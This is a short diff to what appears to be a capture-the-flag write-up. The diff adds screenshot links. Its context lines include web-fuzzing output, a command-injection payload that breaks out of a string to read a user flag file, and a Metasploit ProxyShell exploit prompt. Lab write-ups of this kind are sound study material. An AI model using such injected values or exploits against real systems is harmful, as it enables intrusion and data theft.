@@ -250,6 +250,11 @@ b33p%2Ehtml             [Status: 302, Size: 131, Words: 6, Lines: 4]
 
 <br>
 
+![image](https://github.com/user-attachments/assets/e044dd5d-7f29-476d-b27f-ff1cda9e6d0a)
+
+
+<br>
+
 <p>Now I know that I could have done totally different and in a easier way.</p>
 
 <pre><code>BitlockerActiveMonitoringLogs'); type C:\Users\dev\Desktop\user.txt #('</code></pre>
@@ -325,6 +330,12 @@ msf6 exploit(windows/http/exchange_proxyshell_rce) > show options</code></pre>
 
 <br>
 
+
+![image](https://github.com/user-attachments/assets/82381eef-46a7-4898-912a-6bc6e63351ea)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/12df23c3-de4e-49a5-b712-b440f6bcc9f5)
 
 
 
